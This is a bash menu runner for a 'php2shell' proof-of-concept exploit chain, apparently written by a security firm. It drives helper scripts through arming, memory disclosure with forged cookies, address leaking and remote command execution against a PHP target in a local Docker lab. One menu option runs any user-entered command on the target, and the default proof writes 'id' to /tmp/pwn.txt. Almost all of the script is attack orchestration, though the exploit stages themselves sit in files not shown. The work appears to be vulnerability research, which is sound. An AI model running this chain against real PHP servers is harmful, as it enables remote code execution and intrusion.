#!/bin/bash
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

# poc_menu.sh - numbered runner for the php2shell PoC on the measurement host.
#
#   1  full chain against the stock MPM target (150 workers)
#   2  full chain against the single-worker baseline
#   3  full chain with a custom command
#   4  disclosure only, ASLR check (no execution stage)
#
# The full-chain actions go through chain.sh, so preflight and the arming gate run for them too.
#
# Interactive by default; `poc_menu.sh <number>` runs one action and exits, which is also how the
# script is exercised in CI-like checks.
set -u

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
LAB="${LAB:-$(cd "$HERE/.." && pwd)}"
TARGET="${TARGET:-http://127.0.0.1:18110/index.php}"
CONTAINER="${CONTAINER:-p2s-target}"
WORSTOCK=150
SINGLE_TAG="--single"
SPEC="G:511:0x137*14,G:400:0x137,X:900"
LOOPS=5

cd "$LAB" 2>/dev/null || { echo "lab directory not found: $LAB" >&2; exit 1; }
for tool in docker python3; do
  command -v "$tool" >/dev/null 2>&1 || { echo "missing tool: $tool" >&2; exit 1; }
done
[ -f poc/chain.sh ] || { echo "missing poc/chain.sh in $LAB" >&2; exit 1; }
[ -f lab/start_target.sh ] || { echo "missing lab/start_target.sh in $LAB" >&2; exit 1; }

# ---------------------------------------------------------------- helpers
fresh_target() {
  # $1: --single for the one-worker config, nothing for the stock MPM config
  echo "[*] starting a fresh target container"
  NAME="$CONTAINER" bash lab/start_target.sh "$@" >/dev/null 2>&1
  sleep 2
  docker ps --filter "name=$CONTAINER" --format '    target: {{.Names}} {{.Status}}'
}

arm_and_leak() {
  # A1 + B1, prints the address set. Returns non-zero when the disclosure is not usable.
  local cookie="$1"
  echo "[*] A1: arming"
  python3 poc/a1_arm.py --url "$TARGET" --repeat 1 --sid-hex 00 --big 78 \
          --query-n 5 --query-len 1 --timeout 120 2>/dev/null \
    | grep -E 'attempt|VERDICT' | head -2
  sleep 1
  echo "[*] B1: disclosure"
  python3 poc/b1_forge.py --url "$TARGET" --spec "$SPEC" --fake-len 0xC8000 \
          --sid a --progress-first --chunked --save-cookie "$cookie" 2>/dev/null \
    | grep -E 'response|Set-Cookie' || return 1
  python3 poc/leak_addrs.py --cookie-file "$cookie" --emit shell
}

full_chain() {
  # $1: --single or "" | $2: command | $3: proof path | $4: workers
  local mode="$1" cmd="$2" proof="$3" workers="$4"
  fresh_target $mode
  local args=(--target "$TARGET" --container "$CONTAINER" --probe /probe.php --cmd "$cmd" --proof "$proof")
  [ "$workers" -gt 1 ] && args+=(--workers "$workers")
  echo "[*] chain: A1 -> B1 -> addresses -> A2 -> B2"
  # No filtering here: chain.sh already trims its own output, and the proof is whatever command we
  # were asked to run - filtering it would silently hide lines that do not look like ours.
  bash poc/chain.sh "${args[@]}"
}

action_1() {
  echo "== 1: full chain, stock MPM ($WORSTOCK workers)"
  full_chain "" 'id>/tmp/pwn.txt' /tmp/pwn.txt "$WORSTOCK"
}

action_2() {
  echo "== 2: full chain, single-worker baseline"
  full_chain "$SINGLE_TAG" 'id>/tmp/pwn.txt' /tmp/pwn.txt 0
}

action_3() {
  echo "== 3: full chain with a custom command"
  local cmd proof
  read -r -p "command to run on the target [id>/tmp/pwn.txt]: " cmd
  cmd="${cmd:-id>/tmp/pwn.txt}"
  read -r -p "proof file inside the container [/tmp/pwn.txt]: " proof
  proof="${proof:-/tmp/pwn.txt}"
  # A custom command is what this option is for; the pool is not the interesting variable, and on a
  # multi-worker target the fire is a pinning race (measured 1/3 on x86-64 against 2/2 single-worker), so
  # this path uses the one-worker baseline instead of inheriting the stock pool.
  full_chain "$SINGLE_TAG" "$cmd" "$proof" 0
}

action_4() {
  echo "== 4: disclosure only, ASLR check ($LOOPS fresh containers)"
  local i cookie bases
  cookie=$(mktemp)
  for ((i = 1; i <= LOOPS; i++)); do
    fresh_target "$SINGLE_TAG" >/dev/null
    if [ "$i" = 1 ]; then
      python3 poc/preflight.py --url "$TARGET" --probe /probe.php \
        || { echo "[!] preflight failed for this container" >&2; rm -f "$cookie"; return 1; }
    fi
    if bases=$(arm_and_leak "$cookie" | grep -E '^LIBPHP=|^CHUNK=|^MAIN=|^S=|^HSV='); then
      echo "  run$i $(echo "$bases" | tr '\n' ' ')"
    else
      echo "  run$i incomplete: the disclosure has no fingerprint cluster"
    fi
    sleep 1
  done
  rm -f "$cookie"
}

menu() {
  cat <<EOF

php2shell PoC runner   (lab: $LAB)
  1) full chain, stock MPM ($WORSTOCK workers)
  2) full chain, single-worker baseline
  3) full chain with a custom command
  4) disclosure only, ASLR check ($LOOPS containers)
  q) quit
EOF
}

dispatch() {
  case "$1" in
    1) action_1 ;;
    2) action_2 ;;
    3) action_3 ;;
    4) action_4 ;;
    q|Q) return 1 ;;
    *) echo "unknown choice: $1" ;;
  esac
  return 0
}

# ---------------------------------------------------------------- entry point
if [ $# -gt 0 ]; then
  case "$1" in
    --loops) LOOPS="$2"; shift 2 ;;
  esac
fi
if [ $# -gt 0 ]; then
  dispatch "$1" || exit 1
  exit 0
fi

while true; do
  menu
  read -r -p "choice: " choice
  dispatch "$choice" || { echo "bye"; exit 0; }
done
